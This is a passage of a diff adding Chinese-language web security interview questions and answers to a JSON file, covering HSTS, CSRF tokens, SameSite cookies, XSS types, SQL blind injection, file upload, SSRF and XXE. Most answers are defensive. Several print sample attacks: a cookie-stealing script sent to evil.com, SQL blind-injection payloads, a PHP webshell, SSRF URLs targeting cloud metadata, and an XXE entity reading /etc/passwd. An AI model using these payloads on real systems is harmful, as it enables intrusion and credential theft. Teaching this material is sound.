**form-action** | 表单提交目标 |\n\n## 关键要点\n\n- CSP是**防御XSS**的有效手段\n- **nonce**比'unsafe-inline'更安全\n- CSP可以配置**报告模式**监控违规\n- 过于严格的CSP可能**影响功能**\n\n## 面试高频追问\n\n1. CSP的nonce和hash有什么区别？\n2. CSP报告模式和强制模式有什么区别？\n3. 如何为现有网站部署CSP？",
+    "tags": [
+      "CSP",
+      "XSS防御",
+      "内容安全策略"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-018",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是HTTP严格传输安全（HSTS）？",
+    "answer": "## 核心概念\n\nHSTS（HTTP Strict Transport Security）是一种安全机制，强制浏览器在指定时间内只使用HTTPS访问网站，防止SSL剥离攻击。\n\n## HSTS工作原理\n\n```text\n1. 首次访问（HTTP）:\n   用户访问 http://example.com\n   服务器响应:\n   HTTP/1.1 301 Moved Permanently\n   Location: https://example.com\n   Strict-Transport-Security: max-age=31536000; includeSubDomains\n\n2. 浏览器记录HSTS:\n   以后访问example.com时，自动使用HTTPS\n   即使用户输入http://...\n\n3. 后续访问:\n   浏览器自动将http://转为https://\n   如果证书错误，阻止访问（不显示继续按钮）\n```\n\n## HSTS头部参数\n\n| 参数 | 说明 | 示例 |\n|------|------|------|\n| **max-age** | 有效期（秒） | 31536000（1年） |\n| **includeSubDomains** | 包含子域名 | 可选 |\n| **preload** | 预加载列表 | 可选 |\n\n## HSTS预加载\n```text\n问题: 首次访问可能不安全\n\n解决: HSTS预加载列表\n- 浏览器内置的HSTS列表\n- 在首次访问前就强制HTTPS\n- 需要申请加入预加载列表\n```\n\n## 防御的攻击\n\n| 攻击 | 说明 |\n|------|------|\n| **SSL剥离** | 将HTTPS降级为HTTP |\n| **Cookie劫持** | HTTP请求泄露Cookie |\n| **中间人攻击** | HTTP通信被窃听 |\n\n## 关键要点\n\n- HSTS强制浏览器使用**HTTPS**\n- 首次访问仍然可能不安全（使用**预加载**解决）\n- HSTS可以**防止SSL剥离**攻击\n- 部署HSTS前必须确保**HTTPS完全可用**\n\n## 面试高频追问\n\n1. HSTS预加载是什么？如何加入？\n2. HSTS的max-age应该设多大？\n3. 如果HTTPS证书过期，HSTS会导致什么问题？",
+    "tags": [
+      "HSTS",
+      "HTTPS",
+      "SSL剥离"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-019",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是CSRF Token？CSRF Token的工作原理是什么？",
+    "answer": "## 核心概念\n\nCSRF Token是防御CSRF攻击的常用方法，通过在请求中添加随机Token，验证请求的合法性。\n\n## 工作原理\n\n```text\n1. 用户访问页面:\n   服务器生成随机Token，存入Session\n   Token = \"abc123xyz\"\n\n2. 页面中包含Token:\n   <form method=\"POST\" action=\"/transfer\">\n     <input type=\"hidden\" name=\"csrf_token\" value=\"abc123xyz\">\n     <input name=\"amount\" value=\"100\">\n     <button type=\"submit\">提交</button>\n   </form>\n\n3. 提交时:\n   POST /transfer\n   amount=100&csrf_token=abc123xyz\n\n4. 服务器验证:\n   检查csrf_token是否与Session中的一致\n   一致: 处理请求\n   不一致: 拒绝请求\n```\n\n## Token生成要求\n\n| 要求 | 说明 |\n|------|------|\n| **随机性** | 使用安全的随机数生成器 |\n| **唯一性** | 每个用户/会话独立 |\n| **保密性** | 不能暴露在URL中 |\n| **不可预测** | 攻击者无法猜测 |\n\n## Token传递方式\n\n| 方式 | 说明 | 安全性 |\n|------|------|--------|\n| **隐藏表单字段** | <input type=\"hidden\"> | 高 |\n| **HTTP头部** | 自定义头部（如X-CSRF-Token） | 高 |\n| **Cookie** | 双重Cookie验证 | 中 |\n\n## 关键要点\n\n- CSRF Token必须**不可预测**\n- Token应该与**用户会话**关联\n- **GET请求**不应该有副作用（幂等性）\n- Token应该放在**请求体或头部**，不要放在URL中\n\n## 面试高频追问\n\n1. 为什么CSRF Token能防止CSRF攻击？\n2. 如何在前后端分离架构中使用CSRF Token？\n3. SameSite Cookie和CSRF Token哪个更好？",
+    "tags": [
+      "CSRF Token",
+      "防御机制",
+      "Web安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-020",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是XSS的DOM型攻击？DOM型XSS和反射型XSS有什么区别？",
+    "answer": "## 核心概念\n\nDOM型XSS是完全在客户端发生的XSS攻击，恶意脚本通过前端JavaScript操作DOM执行，不经过服务器。\n\n## DOM型XSS示例\n\n```text\nURL: https://example.com/page#<img src=x onerror=alert(1)>\n\n页面JavaScript:\nvar hash = location.hash.substring(1);\ndocument.getElementById('content').innerHTML = decodeURIComponent(hash);\n\n→ 恶意脚本直接插入DOM\n→ 在客户端执行\n```\n\n## 反射型 vs DOM型XSS\n\n| 对比维度 | 反射型XSS | DOM型XSS |\n|----------|----------|----------|\n| 执行位置 | 服务器渲染后执行 | 客户端DOM操作执行 |\n| 服务器参与 | 服务器将脚本反射回页面 | 服务器不参与 |\n| 服务器日志 | 有记录 | 无记录 |\n| 检测难度 | 较易（服务器端可检测） | 较难（纯客户端） |\n| 防御位置 | 服务器端 | 客户端JavaScript |\n\n## DOM型XSS的危险源\n\n```text\n输入源:\n- location.hash\n- location.search\n- document.referrer\n- window.name\n- localStorage/sessionStorage\n\n危险的DOM操作:\n- innerHTML\n- outerHTML\ndocument.write()\neval()\nsetTimeout/setInterval (字符串参数)\n```\n\n## 防御措施\n\n| 措施 | 说明 |\n|------|------|\n| **避免innerHTML** | 使用textContent代替 |\n| **输入验证** | 验证并过滤输入 |\n| **输出编码** | 对DOM操作的值进行编码 |\n| **CSP** | 限制可执行的脚本 |\n| **框架默认转义** | React/Vue自动转义 |\n\n## 关键要点\n\n- DOM型XSS**完全在客户端**，服务器无法检测\n- 避免使用**innerHTML**，使用**textContent**\n- **CSP**可以限制内联脚本执行\n- 现代框架默认有防护，但需注意**dangerouslySetInnerHTML**等API\n\n## 面试高频追问\n\n1. innerHTML和textContent有什么区别？\n2. 如何检测DOM型XSS？\n3. 为什么React默认可以防止XSS？",
+    "tags": [
+      "DOM型XSS",
+      "innerHTML",
+      "客户端安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-021",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是CSRF攻击的SameSite Cookie防御？",
+    "answer": "## 核心概念\n\nSameSite Cookie属性可以限制Cookie在跨站请求中的发送，从根源上防止CSRF攻击。\n\n## SameSite值\n\n| 值 | 行为 | 安全性 |\n|------|------|--------|\n| **Strict** | 跨站请求完全不发送Cookie | 最高 |\n| **Lax** | 顶级导航的GET请求发送 | 高 |\n| **None** | 所有请求都发送（需Secure） | 无 |\n\n## SameSite=Lax的工作原理\n\n```text\n正常站内请求:\nGET /api/data (同站)\n→ 携带Cookie ✓\n\n跨站POST请求:\nPOST /api/transfer (来自evil.com)\n→ 不携带Cookie ✗\n→ CSRF攻击失败\n\n跨站GET请求 (顶级导航):\n<a href=\"https://bank.com/transfer\">\n→ 携带Cookie ✓\n→ 但GET请求应该是幂等的\n```\n\n## SameSite vs CSRF Token\n\n| 对比维度 | SameSite Cookie | CSRF Token |\n|----------|----------------|------------|\n| 防御位置 | 浏览器层面 | 应用层面 |\n| 配置位置 | Set-Cookie头部 | 表单/请求头 |\n| 兼容性 | 现代浏览器 | 所有浏览器 |\n| 灵活性 | 较低 | 较高 |\n| 防御效果 | 好（默认Lax） | 好 |\n\n## 关键要点\n\n- **Lax**是现代浏览器的默认值\n- **SameSite=None**必须同时设置**Secure**\n- SameSite不能防御**同站CSRF**\n- 建议**SameSite + CSRF Token**双重防御\n\n## 面试高频追问\n\n1. SameSite的默认值是什么时候变成Lax的？\n2. SameSite=None为什么要设置Secure？\n3. SameSite能完全替代CSRF Token吗？",
+    "tags": [
+      "SameSite",
+      "CSRF防御",
+      "Cookie"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-022",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是CSRF攻击的双重Cookie验证？",
+    "answer": "## 核心概念\n\n双重Cookie验证是一种CSRF防御方法，通过验证请求中的Cookie值和请求参数中的值是否一致来判断请求合法性。\n\n## 工作原理\n\n```text\n1. 服务器设置Cookie:\n   Set-Cookie: csrf_token=abc123\n\n2. 前端读取Cookie并放入请求:\n   // JavaScript读取Cookie中的token\n   const token = getCookie('csrf_token');\n   \n   // 放入请求参数或头部\n   fetch('/api/transfer', {\n     method: 'POST',\n     headers: {'X-CSRF-Token': token},\n     body: JSON.stringify({amount: 100})\n   });\n\n3. 服务器验证:\n   cookie_token = request.cookies['csrf_token']\n   header_token = request.headers['X-CSRF-Token']\n   \n   if cookie_token == header_token:\n     处理请求\n   else:\n     拒绝请求\n```\n\n## 为什么能防御CSRF\n\n```text\nCSRF攻击:\n恶意网站发送请求 → 浏览器自动携带Cookie\n→ 但恶意网站的JavaScript无法读取Cookie\n→ 无法将Token放入请求头\n→ 服务器验证失败\n```\n\n## 双重Cookie vs CSRF Token Session\n\n| 对比维度 | 双重Cookie | CSRF Token Session |\n|----------|-----------|-------------------|\n| 服务器状态 | 无状态 | 有状态（Session） |\n| 实现复杂度 | 简单 | 较复杂 |\n| 分布式支持 | 好 | 需要共享Session |\n| 安全性 | 较高 | 高 |\n\n## 关键要点\n\n- 双重Cookie是**无状态**的，适合分布式系统\n- 需要JavaScript**读取Cookie**，因此Cookie不能设HttpOnly\n- **SameSite=Lax**可以替代双重Cookie的大部分场景\n- 建议与**SameSite**结合使用\n\n## 面试高频追问\n\n1. 为什么双重Cookie不需要服务器存储Token？\n2. 双重Cookie和普通CSRF Token有什么区别？\n3. 双重Cookie的缺点是什么？",
+    "tags": [
+      "双重Cookie",
+      "CSRF防御",
+      "无状态"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-023",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是存储型XSS？存储型XSS比反射型XSS危害更大的原因是什么？",
+    "answer": "## 核心概念\n\n存储型XSS（Stored XSS）是将恶意脚本永久存储在目标服务器上（如数据库），所有访问该页面的用户都会受到攻击。\n\n## 存储型XSS示例\n\n```text\n场景: 论坛评论系统\n\n1. 攻击者发布评论:\n   \"这篇文章很好！<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>\"\n\n2. 服务器将评论存入数据库\n\n3. 其他用户访问该页面:\n   → 服务器返回包含恶意脚本的页面\n   → 浏览器执行脚本\n   → 用户Cookie被窃取\n\n影响: 所有访问该页面的用户\n```\n\n## 存储型 vs 反射型XSS\n\n| 对比维度 | 存储型XSS | 反射型XSS |\n|----------|----------|----------|\n| 存储位置 | 服务器数据库 | URL参数 |\n| 持久性 | 持久化 | 非持久化 |\n| 影响范围 | 所有访问用户 | 只有点击恶意链接的用户 |\n| 触发方式 | 正常访问页面 | 需要诱导点击链接 |\n| 危害程度 | 更高 | 相对较低 |\n| 攻击成本 | 一次注入，持续生效 | 每次需要诱导 |\n\n## 存储型XSS危害更大的原因\n\n```text\n1. 影响范围广:\n   所有访问该页面的用户都受影响\n   不需要诱导每个用户点击链接\n\n2. 持久性:\n   脚本永久存储，直到被发现和清除\n   可以持续窃取用户数据\n\n3. 信任度高:\n   用户访问正常网站，不会怀疑\n   比诱导点击链接更可信\n\n4. 难以发现:\n   可能很长时间不被发现\n   攻击者可以持续收集数据\n```\n\n## 防御措施\n\n| 措施 | 说明 |\n|------|------|\n| **输入过滤** | 存储前过滤危险字符 |\n| **输出编码** | 显示时进行HTML编码 |\n| **CSP** | 限制脚本执行 |\n| **HttpOnly Cookie** | 防止Cookie窃取 |\n\n## 关键要点\n\n- 存储型XSS是**最危险**的XSS类型\n- 影响**所有访问用户**，不需要诱导\n- **输入过滤 + 输出编码**是主要防御手段\n- **CSP**是最后一道防线\n\n## 面试高频追问\n\n1. 如何检测存储型XSS漏洞？\n2. 输入过滤和输出编码哪个更重要？\n3. 为什么有了CSP还需要输入过滤？",
+    "tags": [
+      "存储型XSS",
+      "持久化",
+      "Web安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-024",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是JWT的刷新机制？access_token和refresh_token有什么区别？",
+    "answer": "## 核心概念\n\nJWT的刷新机制通过短期access_token和长期refresh_token的组合，在安全性和用户体验之间取得平衡。\n\n## 两种Token的区别\n\n| 对比维度 | access_token | refresh_token |\n|----------|-------------|---------------|\n| 用途 | 访问资源 | 刷新access_token |\n| 有效期 | 短（15分钟-1小时） | 长（7天-30天） |\n| 存储位置 | 内存/变量 | 安全存储 |\n| 发送频率 | 每次请求 | 仅刷新时 |\n| 泄露影响 | 较小（短期有效） | 较大（长期有效） |\n\n## 刷新流程\n\n```text\n1. 用户登录:\n   → 服务器返回access_token + refresh_token\n\n2. 正常请求:\n   Authorization: Bearer access_token\n   → 服务器验证Token有效\n\n3. access_token过期:\n   → 请求返回401 Unauthorized\n\n4. 使用refresh_token刷新:\n   POST /auth/refresh\n   {\"refresh_token\": \"xxx\"}\n   → 服务器验证refresh_token\n   → 返回新的access_token\n\n5. 使用新的access_token继续请求\n```\n\n## 安全考虑\n\n| 问题 | 解决方案 |\n|------|----------|\n| refresh_token泄露 | 使用一次性refresh_token（旋转） |\n| Token被盗用 | 绑定设备/IP |\n| 长期有效风险 | 缩短有效期 + 重新认证 |\n| 多设备管理 | 支持多refresh_token |\n\n## 关键要点\n\n- access_token**短期有效**，减少泄露影响\n- refresh_token**长期有效**，但应安全存储\n- **refresh_token旋转**可以提高安全性\n- 建议access_token有效期**15分钟到1小时**\n\n## 面试高频追问\n\n1. 为什么不直接使用长期有效的access_token？\n2. refresh_token应该存储在哪里？\n3. 什么是refresh_token旋转？",
+    "tags": [
+      "JWT刷新",
+      "access_token",
+      "refresh_token"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-025",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是CSRF和XSS的组合攻击？",
+    "answer": "## 核心概念\n\nCSRF和XSS可以组合使用，XSS漏洞可以绕过CSRF防御机制，形成更强大的攻击。\n\n## XSS绕过CSRF Token\n\n```text\n场景: 网站使用CSRF Token防御\n\n攻击步骤:\n1. 攻击者发现XSS漏洞\n2. 注入脚本获取CSRF Token:\n   <script>\n   fetch('/api/csrf-token')\n     .then(r => r.json())\n     .then(data => {\n       // 获取到Token\n       fetch('/api/transfer', {\n         method: 'POST',\n         headers: {'X-CSRF-Token': data.token},\n         body: {to: 'hacker', amount: 10000}\n       });\n     });\n   </script>\n\n3. 脚本在受害者浏览器执行\n4. 自动获取Token并发送恶意请求\n```\n\n## XSS绕过SameSite Cookie\n\n```text\nSameSite Cookie限制:\n跨站请求不携带Cookie\n\n但XSS是同站攻击:\n恶意脚本在目标网站上下文执行\n→ 不受SameSite限制\n→ 可以携带Cookie发送请求\n```\n\n## 组合攻击的危害\n\n| 单独攻击 | 组合攻击 |\n|----------|----------|\n| CSRF可被Token防御 | XSS可以获取Token |\n| CSRF受SameSite限制 | XSS是同站，不受限 |\n| XSS可能无法修改数据 | CSRF可以执行操作 |\n\n## 防御策略\n\n```text\n1. 防止XSS（根本）:\n   - 输入过滤\n   - 输出编码\n   - CSP\n\n2. 多重防御:\n   - CSRF Token + SameSite + 验证码\n\n3. 最小权限:\n   - 敏感操作需要二次确认\n```\n\n## 关键要点\n\n- XSS可以**绕过大多数CSRF防御**\n- 防止XSS是**根本**，CSRF防御是**补充**\n- **敏感操作**应有二次确认（如密码确认）\n- **CSP**是防止XSS的最后防线\n\n## 面试高频追问\n\n1. XSS为什么能绕过CSRF Token？\n2. SameSite为什么不能防御XSS发起的CSRF？\n3. 如何设计安全的敏感操作流程？",
+    "tags": [
+      "XSS",
+      "CSRF",
+      "组合攻击"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-026",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是SQL注入的盲注？盲注有哪些类型？",
+    "answer": "## 核心概念\n\nSQL盲注是一种SQL注入技术，当应用不直接显示查询结果时，攻击者通过观察应用的行为差异来推断数据。\n\n## 盲注类型\n\n### 1. 布尔盲注\n```text\n通过页面返回差异判断:\n\n注入: id=1 AND 1=1 → 页面正常\n注入: id=1 AND 1=2 → 页面异常\n\n→ 条件为真时页面正常，为假时异常\n→ 逐位推断数据\n\n例:\nAND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'\n→ 如果页面正常，第一个字符是'a'\n```\n\n### 2. 时间盲注\n```text\n通过响应延迟判断:\n\n注入: id=1 AND SLEEP(5)\n→ 如果延迟5秒，条件为真\n\n例:\nAND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0)\n→ 如果延迟5秒，第一个字符是'a'\n```\n\n### 3. 报错盲注\n```text\n通过数据库错误信息:\n\n注入: id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)\n→ 数据库返回错误信息，包含数据\n```\n\n## 盲注的防御\n\n| 防御措施 | 说明 |\n|----------|------|\n| **参数化查询** | 最根本的防御 |\n| **输入验证** | 限制输入格式 |\n| **错误处理** | 不返回详细错误信息 |\n| **WAF** | 检测注入特征 |\n\n## 关键要点\n\n- 盲注不直接显示数据，需要**逐位推断**\n- 布尔盲注通过**页面差异**判断，时间盲注通过**延迟**判断\n- **参数化查询**是防御盲注的根本方法\n- 生产环境不应返回**详细错误信息**\n\n## 面试高频追问\n\n1. 布尔盲注和时间盲注各适合什么场景？\n2. 如何提高盲注的效率？\n3. 参数化查询为什么能防止盲注？",
+    "tags": [
+      "SQL盲注",
+      "布尔盲注",
+      "时间盲注"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-027",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是文件上传漏洞？如何安全地处理文件上传？",
+    "answer": "## 核心概念\n\n文件上传漏洞是指攻击者利用文件上传功能上传恶意文件（如WebShell），从而控制服务器。\n\n## 常见攻击方式\n\n```text\n1. 上传WebShell:\n   <?php system($_GET['cmd']); ?>\n   保存为shell.php\n   → 访问shell.php?cmd=ls 执行命令\n\n2. 绕过前端验证:\n   前端只检查文件扩展名\n   → 修改请求绕过前端\n\n3. 绕过后端验证:\n   - 双扩展名: shell.php.jpg\n   - 大小写: shell.pHp\n   - 空字节: shell.php%00.jpg\n   - MIME类型: Content-Type改为image/jpeg\n\n4. 图片马:\n   在图片中嵌入恶意代码\n   → 配合文件包含漏洞执行\n```\n\n## 安全的文件上传\n\n| 措施 | 说明 |\n|------|------|\n| **白名单验证** | 只允许特定扩展名 |\n| **MIME类型检查** | 检查文件真实类型 |\n| **文件内容检查** | 检查文件头和内容 |\n| **重命名文件** | 使用随机文件名 |\n| **存储隔离** | 上传目录不解析脚本 |\n| **大小限制** | 限制文件大小 |\n| **病毒扫描** | 扫描上传文件 |\n\n## Nginx安全配置\n\n```nginx\n# 上传目录不解析PHP\nlocation /uploads/ {\n    location ~ \\.php$ {\n        deny all;\n    }\n}\n```\n\n## 关键要点\n\n- 使用**白名单**而非黑名单验证扩展名\n- 不要信任客户端的**Content-Type**\n- 上传文件应**重命名**，使用随机名\n- 上传目录应**禁止脚本执行**\n\n## 面试高频追问\n\n1. 为什么白名单比黑名单更安全？\n2. 什么是图片马？如何防范？\n3. 如何安全地存储用户上传的文件？",
+    "tags": [
+      "文件上传",
+      "WebShell",
+      "安全配置"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-028",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是密码哈希的彩虹表攻击？如何防御？",
+    "answer": "## 核心概念\n\n彩虹表（Rainbow Table）是一种预计算的哈希-密码映射表，用于快速破解哈希后的密码。\n\n## 彩虹表攻击原理\n\n```text\n攻击步骤:\n1. 攻击者预先计算常见密码的哈希值\n   \"123456\" → e10adc3949ba59abbe56e057f20f883e (MD5)\n   \"password\" → 5f4dcc3b5aa765d61d8327deb882cf99\n   \"qwerty\" → d8578edf8458ce06fbc5bb76a58c5ca4\n   ... (数百万个)\n\n2. 数据库泄露，攻击者获得哈希值\n   user1: e10adc3949ba59abbe56e057f20f883e\n\n3. 在彩虹表中查找\n   找到匹配: e10adc3949ba59abbe56e057f20f883e = \"123456\"\n\n4. 得到明文密码\n```\n\n## 防御：加盐哈希\n\n```text\n加盐后:\n用户1: salt=abc123, hash=bcrypt(\"123456\" + \"abc123\")\n用户2: salt=def456, hash=bcrypt(\"123456\" + \"def456\")\n\n→ 相同密码，不同盐，不同哈希\n→ 彩虹表无法预计算（盐是随机的）\n→ 每个用户需要单独破解\n```\n\n## 加盐哈希的优势\n\n| 优势 | 说明 |\n|------|------|\n| 抗彩虹表 | 盐随机，无法预计算 |\n| 抗批量破解 | 相同密码产生不同哈希 |\n| 抗暴力破解 | 慢哈希算法增加破解成本 |\n\n## 推荐算法\n\n| 算法 | 特点 | 推荐度 |\n|------|------|--------|\n| **bcrypt** | 自适应，内置盐 | 推荐 |\n| **Argon2** | 抗GPU，最新 | 最推荐 |\n| **scrypt** | 内存密集型 | 推荐 |\n| **PBKDF2** | 可调节迭代 | 推荐 |\n| MD5 | 太快，已破解 | 不推荐 |\n\n## 关键要点\n\n- 彩虹表利用**预计算**加速破解\n- **加盐**使预计算无效\n- **慢哈希算法**增加暴力破解成本\n- 每个用户应有**独立的随机盐**\n\n## 面试高频追问\n\n1. 彩虹表和字典攻击有什么区别？\n2. 为什么盐必须是随机的？\n3. 为什么MD5不适合密码哈希？",
+    "tags": [
+      "彩虹表",
+      "加盐哈希",
+      "密码安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-029",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是会话固定攻击（Session Fixation）？如何防御？",
+    "answer": "## 核心概念\n\n会话固定攻击是指攻击者预先设置一个Session ID，诱导用户使用该Session ID登录，从而劫持用户的会话。\n\n## 攻击流程\n\n```text\n1. 攻击者获取Session ID:\n   访问网站，获得Session ID = abc123\n\n2. 构造恶意链接:\n   https://bank.com/login?session_id=abc123\n   或通过其他方式将Session ID注入用户浏览器\n\n3. 用户使用该链接登录:\n   用户输入用户名密码\n   服务器验证通过\n   Session ID = abc123 与用户关联\n\n4. 攻击者使用该Session ID:\n   使用abc123访问网站\n   → 已经是登录状态\n   → 可以访问用户的账户\n```\n\n## 防御措施\n\n| 措施 | 说明 |\n|------|------|\n| **登录后重新生成Session** | 最根本的防御 |\n| **不接受URL中的Session ID** | 防止Session注入 |\n| **绑定Session和客户端** | 绑定IP、User-Agent等 |\n| **Session超时** | 设置合理的过期时间 |\n\n## 关键代码\n\n```text\n登录成功后:\n// 销毁旧Session\nsession_destroy();\n\n// 创建新Session\nsession_regenerate_id(true);\n\n// 或者:\nrequest.getSession().invalidate();\nrequest.getSession(true);\n```\n\n## 关键要点\n\n- 登录后**必须重新生成Session ID**\n- 不要接受**URL参数中的Session ID**\n- Session应该与**客户端信息绑定**\n- **Session超时**可以限制攻击窗口\n\n## 面试高频追问\n\n1. 为什么登录后要重新生成Session ID？\n2. Session Fixation和Session Hijacking有什么区别？\n3. 如何检测Session固定攻击？",
+    "tags": [
+      "会话固定",
+      "Session Fixation",
+      "Session安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-030",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是HTTP响应头注入（Header Injection）？如何防御？",
+    "answer": "## 核心概念\n\nHTTP响应头注入是指攻击者通过在响应头中注入换行符（CRLF），添加恶意的响应头或分割响应。\n\n## 攻击示例\n\n```text\n正常场景:\nSet-Cookie: name=value\n\n注入攻击:\n输入: value\\r\\nX-Injected-Header: evil\n\n响应头:\nSet-Cookie: value\nX-Injected-Header: evil\n\n更严重:\n输入: value\\r\\n\\r\\n<html>恶意内容</html>\n\n→ 分割响应，注入恶意页面\n```\n\n## 攻击危害\n\n| 危害 | 说明 |\n|------|------|\n| **XSS** | 注入恶意脚本 |\n| **缓存投毒** | 篡改缓存内容 |\n| **会话固定** | 设置恶意Cookie |\n| **重定向** | 重定向到恶意网站 |\n\n## 防御措施\n\n| 措施 | 说明 |\n|------|------|\n| **输入过滤** | 过滤CRLF（\\r\\n） |\n| **输出编码** | 编码特殊字符 |\n| **框架默认防护** | 现代框架自动处理 |\n| **避免用户输入进入头部** | 不要将用户输入放入响应头 |\n\n## 关键代码\n\n```text\n# 错误做法\nresponse.setHeader(\"Location\", userInput);\n\n# 正确做法\nresponse.sendRedirect(encodeURL(userInput));\n```\n\n## 关键要点\n\n- **CRLF注入**是响应头注入的核心\n- **不要信任用户输入**放入响应头\n- 使用**框架提供的API**设置响应头\n- **输入验证**过滤换行符\n\n## 面试高频追问\n\n1. CRLF是什么？为什么CRLF能注入响应头？\n2. 响应头注入和XSS有什么关系？\n3. 哪些响应头容易被注入？",
+    "tags": [
+      "响应头注入",
+      "CRLF注入",
+      "HTTP安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-031",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是SSRF（服务器端请求伪造）？如何防御？",
+    "answer": "## 核心概念\n\nSSRF（Server-Side Request Forgery）是指攻击者诱导服务器向内部或外部系统发起请求，从而访问受保护的资源。\n\n## 攻击示例\n\n```text\n场景: 应用允许用户输入URL获取内容\n\n攻击:\nhttps://example.com/fetch?url=http://internal-server/admin\n→ 服务器访问内部服务器\n→ 绕过防火墙\n\n更危险:\nhttps://example.com/fetch?url=file:///etc/passwd\n→ 读取本地文件\n\nhttps://example.com/fetch?url=http://169.254.169.254/latest/meta-data/\n→ 访问云服务元数据\n```\n\n## SSRF的危害\n\n| 危害 | 说明 |\n|------|------|\n| **访问内部服务** | 绕过防火墙访问内部API |\n| **读取本地文件** | 使用file://协议 |\n| **云服务元数据** | 获取云服务凭证 |\n| **端口扫描** | 探测内部网络 |\n| **攻击内部系统** | 利用内部系统漏洞 |\n\n## 防御措施\n\n| 措施 | 说明 |\n|------|------|\n| **URL白名单** | 只允许访问特定域名 |\n| **禁用危险协议** | 禁止file://、gopher://等 |\n| **内网地址过滤** | 禁止访问内网IP |\n| **DNS重绑定防护** | 验证解析后的IP |\n| **最小权限** | 服务器限制出站请求 |\n\n## 关键要点\n\n- SSRF利用**服务器作为跳板**访问内部资源\n- **白名单**比黑名单更安全\n- 云环境要**禁用元数据地址访问**\n- **DNS重绑定**可以绕过简单的IP过滤\n\n## 面试高频追问\n\n1. SSRF和CSRF有什么区别？\n2. 什么是DNS重绑定？\n3. 如何在云环境中防御SSRF？",
+    "tags": [
+      "SSRF",
+      "请求伪造",
+      "内网安全"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-032",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是XXE（XML外部实体注入）？如何防御？",
+    "answer": "## 核心概念\n\nXXE（XML External Entity Injection）是一种针对XML解析器的攻击，通过注入外部实体定义来读取文件、执行请求等。\n\n## 攻击示例\n\n```text\n恶意XML输入:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<user>\n  <name>&xxe;</name>\n</user>\n\n解析结果:\n<user>\n  <name>root:x:0:0:root:/root:/bin/bash\n  ...</name>\n</user>\n\n→ 读取了/etc/passwd文件\n```\n\n## XXE的危害\n\n| 危害 | 说明 |\n|------|------|\n| **文件读取** | 读取服务器文件 |\n| **SSRF** | 通过外部实体发起请求 |\n| **拒绝服务** | 十亿笑攻击（Billion Laughs） |\n| **信息泄露** | 泄露内部信息 |\n\n## 防御措施\n\n| 措施 | 说明 |\n|------|------|\n| **禁用外部实体** | 最根本的防御 |\n| **使用JSON** | 避免使用XML |\n| **输入验证** | 过滤危险字符 |\n| **更新解析器** | 使用最新版本的XML解析器 |\n\n## 各语言禁用外部实体\n\n```text\nJava:\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\ndbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n\nPython:\nfrom defusedxml import ElementTree\n\nPHP:\nlibxml_disable_entity_loader(true);\n```\n\n## 关键要点\n\n- XXE利用**XML外部实体**读取文件或发起请求\n- **禁用外部实体**是最有效的防御\n- 能用**JSON**就不用XML\n- **十亿笑攻击**可以导致DoS\n\n## 面试高频追问\n\n1. 什么是十亿笑攻击？\n2. XXE和SSRF有什么关系？\n3. 为什么建议使用JSON而不是XML？",
+    "tags": [
+      "XXE",
+      "XML注入",
+      "外部实体"
+    ],
+    "source": "高频"
+  },
+  {
+    "id": "net-security-033",
+    "module": "网络安全",
+    "difficulty": 2,
+    "question": "什么是反序列化漏洞？反序列化漏洞的危害是什么？",
